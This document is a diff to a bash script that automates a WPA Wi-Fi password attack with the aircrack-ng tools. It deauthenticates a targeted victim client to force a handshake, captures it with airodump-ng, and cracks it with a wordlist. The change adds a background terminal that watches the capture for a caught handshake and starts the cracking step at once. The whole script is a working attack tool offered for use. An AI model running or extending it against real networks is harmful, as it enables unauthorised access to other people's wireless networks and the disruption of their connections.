@@ -63,6 +63,11 @@ do
 done
 }
 
+check_handshake(){
+sleep 2s
+gnome-terminal -x watch aircrack-ng "essid_${essid}"*.cap
+}
+
 stop_replay(){
 	#here, the time of wasting equals the code's...
 	#it contains:
@@ -178,23 +183,25 @@ AP's essid   is ${essid}
 AP's channel is ${channel}
 AP's bssid   is ${bssid}
 victim's mac is ${client_mac}\n"
-read -ep "now start to dump and replay will in background.
-If a handshake catched (it just splash one time at top-right), press ctrl-c;
-or not, you can also press it for stopping replay.
-if it's hard to see a handshake, after the dumping has begun,
-you can run aircrack-ng \"essid_${essid}*.cap\" in another terminal to check.
+read -ep "now start to dump, and replay will in background.
+If a handshake catched (just splash one time at the top-right of main terminal), press ctrl-c;
+or not catched, you can also press ctrl-c for stopping replay.
+after the dumping starts, 'watch aircrack-ng \"essid_${essid}*.cap\"' will run in another terminal.
+aircrack will report that if a handshake captured. pressing ctrl-c can close the terminal.
 clear? [Press Enter]: "
 
 trap "stop_replay;" INT
 replay_for_wpa "$bssid" "$client_mac" &
+check_handshake &
 
 airodump-ng -c "$channel" --bssid "$bssid" -w "essid_${essid}" mon0
 
 trap "rm -f \"$tmpfile\";airmon-ng stop mon0; echo -e '\nterminated manually...'; exit 2;" INT
-clear
-echo "next, crack the cap file. you can use john, hashcat... by yourself."
-read -ep "here is aircrack-ng -w \"$wordlistfile\" essid_${essid}*.cap
-[Press Enter]: "
+clear; clear
+echo "now, start to crack the cap file for the wifi password.
+or you can use john, hashcat... by yourself later on."
+read -ep "here is 'aircrack-ng -w \"$wordlistfile\" essid_${essid}*.cap'
+[Press Enter to start or ctrl-c to exit]: "
 aircrack-ng -w "$wordlistfile" "essid_${essid}"*.cap
 
 rm -f "$tmpfile"
